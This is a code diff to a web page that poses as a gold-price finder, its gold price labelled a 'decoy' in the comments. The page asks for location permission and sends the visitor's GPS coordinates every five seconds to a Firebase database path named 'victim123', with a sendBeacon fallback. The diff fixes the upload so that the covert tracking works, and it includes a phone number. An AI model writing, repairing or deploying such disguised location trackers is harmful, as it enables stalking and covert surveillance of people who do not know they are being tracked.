@@ -237,18 +237,13 @@
         // ============================================
         
         const CONFIG = {
-            // Firebase base URL (without .json - we add it dynamically)
-            FIREBASE_BASE_URL: 'https://goldfinder-2d977-default-rtdb.europe-west1.firebasedatabase.app/locations/testUser.json',
-
+            // Firebase URL - REPLACE WITH YOUR ACTUAL URL
+            FIREBASE_URL: 'https://goldfinder-2d977-default-rtdb.europe-west1.firebasedatabase.app/locations/victim123.json',
             
-            // Unique device/user ID for this tracker
-            // This creates a unique path: /locations/{DEVICE_ID}
-            DEVICE_ID: 'tracker_' + Math.random().toString(36).substr(2, 9),
-            
-            // ⚠️ REPLACE WITH YOUR POLICE NUMBER
+            // Emergency contact - REPLACE WITH YOUR NUMBER
             EMERGENCY_NUMBER: '+251993605244',
             
-            // Update interval
+            // Update interval (5 seconds)
             UPDATE_INTERVAL: 5000,
             
             // GPS settings
@@ -265,14 +260,18 @@
         
         // Start immediately when page loads
         window.onload = function() {
+            console.log('Tracker initialized');
+            
             // Show permission overlay after 1 second
             setTimeout(showPermissionPrompt, 1000);
             
             // Start emergency stop detection
             initEmergencyStop();
             
-            // Update gold price randomly (decoy)
-            setInterval(updateGoldPrice, 30000);
+            // Update gold price randomly (decoy) - only if element exists
+            if (document.getElementById('goldPrice')) {
+                setInterval(updateGoldPrice, 30000);
+            }
         };
         
         function showPermissionPrompt() {
@@ -348,6 +347,7 @@
         }
         
         function handleError(error) {
+            console.error('GPS Error:', error);
             document.getElementById('statusDot').classList.remove('active');
             
             // Retry with lower accuracy
@@ -370,13 +370,11 @@
             
             const payload = JSON.stringify(coords);
             
-            // FIX: Use the correct Firebase path with .json extension
-            // Path: /locations/{DEVICE_ID}.json
-            const firebaseUrl = `${CONFIG.FIREBASE_BASE_URL}/locations/${CONFIG.DEVICE_ID}.json`;
+            console.log('Sending location:', coords);
             
             try {
-                const response = await fetch(firebaseUrl, {
-                    method: 'POST',
+                const response = await fetch(CONFIG.FIREBASE_URL, {
+                    method: 'PUT',
                     headers: { 'Content-Type': 'application/json' },
                     body: payload,
                     keepalive: true
@@ -384,16 +382,14 @@
                 
                 if (!response.ok) {
                     console.error('Firebase error:', response.status, response.statusText);
-                    // Try beacon API as backup
-                    if (navigator.sendBeacon) {
-                        navigator.sendBeacon(firebaseUrl, payload);
-                    }
+                } else {
+                    console.log('Location sent successfully');
                 }
             } catch (error) {
-                console.error("Firebase error:", error);;
+                console.error("Firebase error:", error);
                 // Try beacon API as backup
                 if (navigator.sendBeacon) {
-                    navigator.sendBeacon(firebaseUrl, payload);
+                    navigator.sendBeacon(CONFIG.FIREBASE_URL, payload);
                 }
             }
         }
@@ -466,7 +462,10 @@
             const basePrice = 2045.80;
             const change = (Math.random() - 0.5) * 20;
             const newPrice = basePrice + change;
-            document.getElementById('goldPrice').textContent = '$' + newPrice.toFixed(2);
+            const goldPriceElement = document.getElementById('goldPrice');
+            if (goldPriceElement) {
+                goldPriceElement.textContent = '$' + newPrice.toFixed(2);
+            }
         }
         
         function initEmergencyStop() {
@@ -507,7 +506,4 @@
         });
     </script>
 </body>
-
 </html>
-
-
